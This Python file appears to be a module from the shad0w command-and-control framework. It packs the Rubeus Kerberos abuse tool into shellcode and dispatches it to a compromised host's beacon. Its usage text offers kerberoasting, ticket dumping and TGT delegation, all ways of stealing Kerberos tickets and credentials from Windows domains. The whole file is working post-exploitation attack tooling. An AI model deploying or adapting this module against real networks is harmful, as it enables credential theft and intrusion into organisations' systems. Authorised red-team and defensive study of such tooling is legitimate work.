#
# Execute rubeus on a session
#

from lib import shellcode

__description__ = "A toolset for raw Kerberos interaction and abuses"
__author__ = "@_batsec_, @harmj0y"
__type__ = "module"

# identify the task as shellcode execute
from lib.basecommand import BaseCommand

USERCD_EXEC_ID = 0x3000

# location of rubeus binary
RUBEUS_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/Rubeus.exe"


class RubeusCommand(BaseCommand):

    def __init__(self, args):
        BaseCommand.__init__(self, "rubeus", args)

    def parse_parameters(self):
        self.parser.add_argument("-x", "--execute", nargs='+', required=True, help="Rubeus command to execute")

    def get_usage(self):
        return """
rubeus -x kerberoast
rubeus -x klist
rubeus -x dump
rubeus -x tgtdeleg
rubeus -x help
"""

    def run(self, shad0w):
        if self.args.execute:
            params = ' '.join(self.args.execute)

            # kind of a hack to make sure we integrate nice with the shellcode generator
            self.args.param = self.args.execute
            self.args.cls = False
            self.args.method = False
            self.args.runtime = False
            self.args.appdomain = False

            b64_comp_data = shellcode.generate(RUBEUS_BIN, self.args, params)

        shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
        shad0w.beacons[shad0w.current_beacon]["callback"] = rubeus_callback


def rubeus_callback(shad0w, data):
    print(data)
    return ""


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon.", log=True)
        return

    cmd = RubeusCommand(args)
    if cmd.parse() is True:
        cmd.run(shad0w)

    return
